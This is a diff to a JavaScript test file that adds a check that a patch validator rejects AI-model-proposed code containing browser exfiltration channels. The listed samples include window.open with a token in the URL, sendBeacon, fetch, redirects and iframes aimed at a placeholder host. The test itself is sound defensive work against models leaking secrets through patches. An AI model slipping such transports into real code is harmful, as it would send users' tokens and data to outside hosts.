@@ -75,6 +75,21 @@ test('provider errors do not expose source or credentials', async () => {
   assert.equal(malformed.status, 'rejected');
 });
 
+test('model replacements cannot add browser side-channel transports', () => {
+  for (const replacement of [
+    'window.open("https://example.invalid/?data=" + token);',
+    'navigator["sendBeacon"]("https://example.invalid", body);',
+    'const pixel = new Image();',
+    'location.assign("https://example.invalid");',
+    'window.location.href = "https://example.invalid";',
+    'document.createElement("iframe");',
+    'globalThis["fetch"]("https://example.invalid");'
+  ]) {
+    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'synthetic safety test' });
+    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
+  }
+});
+
 test('modern provider keys and bearer tokens are rejected before external source disclosure', async () => {
   const examples = [
     'sk-or-v1-' + 'a'.repeat(40),
